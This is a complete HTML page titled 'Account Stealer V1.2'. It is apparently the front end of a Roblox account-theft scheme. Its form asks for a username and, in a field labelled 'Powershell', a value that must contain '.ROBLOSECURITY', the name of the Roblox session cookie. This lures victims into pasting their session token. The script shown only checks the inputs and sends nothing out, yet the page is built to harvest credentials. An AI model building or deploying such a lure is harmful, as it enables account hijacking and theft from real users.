<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Account Stealer</title>
    <link rel="stylesheet" href="style.css">
    <style>
        /* Error message styling */
        .error-message {
            position: absolute;
            top: 100%;  /* Places it just below the input */
            left: 5px;  /* Aligns with input */
            color: #FF7F7F;
            font-size: 12px;
            height: auto;  /* Allows text to appear when needed */
            visibility: hidden;  /* Hides it initially */
        }

        /* Fix input container */
        .input-container {
            position: relative;
            margin-bottom: 30px; /* Adjusted spacing for error messages */
        }

        /* Show error message if there's an error */
        .input-container.error .error-message {
            visibility: visible;
        }

        /* Highlight input field when there's an error */
        .input-container.error input {
            border: 1px solid #FF7F7F; /* Red border when there's an error */
        }

        /* Fix input width */
        .input-container input {
            width: 100%; /* Ensures it fits within form */
            padding-right: 40px; /* Makes space for icon */
            font-size: 16px;  /* Default font-size for input text */
        }

        /* Position icon correctly */
        .input-container svg {
            position: absolute;
            right: 10px;
            top: 50%;
            transform: translateY(-50%);
            width: 18px;
            height: 18px;
            fill: #888;
        }
    </style>
</head>
<body>
    <form class="form">
        <p class="form-title">Account Stealer V1.2</p>
        
        <!-- Username input -->
        <div class="input-container" id="username-container">
            <input placeholder="Username" type="text" id="text" name="text">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor">
                <path fill-rule="evenodd" d="M7.5 6a4.5 4.5 0 1 1 9 0 4.5 4.5 0 0 1-9 0ZM3.751 20.105a8.25 8.25 0 0 1 16.498 0 .75.75 0 0 1-.437.695A18.683 18.683 0 0 1 12 22.5c-2.786 0-5.433-.608-7.812-1.7a.75.75 0 0 1-.437-.695Z" clip-rule="evenodd" />
            </svg>
        </div>
        <div class="error-message" id="username-error"></div>

        <!-- Password input -->
        <div class="input-container" id="password-container">
            <input placeholder="Powershell" type="password" id="password" name="password">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor">
                <path fill-rule="evenodd" d="M3 6a3 3 0 0 1 3-3h12a3 3 0 0 1 3 3v12a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6Zm14.25 6a.75.75 0 0 1-.22.53l-2.25 2.25a.75.75 0 1 1-1.06-1.06L15.44 12l-1.72-1.72a.75.75 0 1 1 1.06-1.06l2.25 2.25c.141.14.22.331.22.53Zm-10.28-.53a.75.75 0 0 0 0 1.06l2.25 2.25a.75.75 0 1 0 1.06-1.06L8.56 12l1.72-1.72a.75.75 0 1 0-1.06-1.06l-2.25 2.25Z" clip-rule="evenodd" />
            </svg>
        </div>
        <div class="error-message" id="password-error"></div>

        <button class="submit" type="button" id="sign-in-button">Verify Account</button>
    </form>

    <script>
        document.getElementById("sign-in-button").addEventListener("click", function(event) {
            event.preventDefault();
            var username = document.getElementById("text").value;
            var password = document.getElementById("password").value;

            // Reset previous error messages
            document.getElementById("username-error").textContent = "";
            document.getElementById("password-error").textContent = "";
            document.getElementById("username-container").classList.remove("error");
            document.getElementById("password-container").classList.remove("error");

            // Check if username is empty
            if (username === "") {
                document.getElementById("username-container").classList.add("error");
            }

            // Check if password includes .ROBLOSECURITY
            if (password === "") {
                document.getElementById("password-container").classList.add("error");
            } else if (!password.includes(".ROBLOSECURITY")) {
                document.getElementById("password-container").classList.add("error");
                document.getElementById("password-error").textContent = "Password must include .ROBLOSECURITY";
            }
        });

        document.getElementById("text").addEventListener("input", function() {
            if (this.value !== "") {
                document.getElementById("username-error").textContent = "";
                document.getElementById("username-container").classList.remove("error");
            }
        });

        document.getElementById("password").addEventListener("input", function() {
            if (this.value !== "") {
                document.getElementById("password-error").textContent = "";
                document.getElementById("password-container").classList.remove("error");
            }
        });
    </script>
</body>
</html>
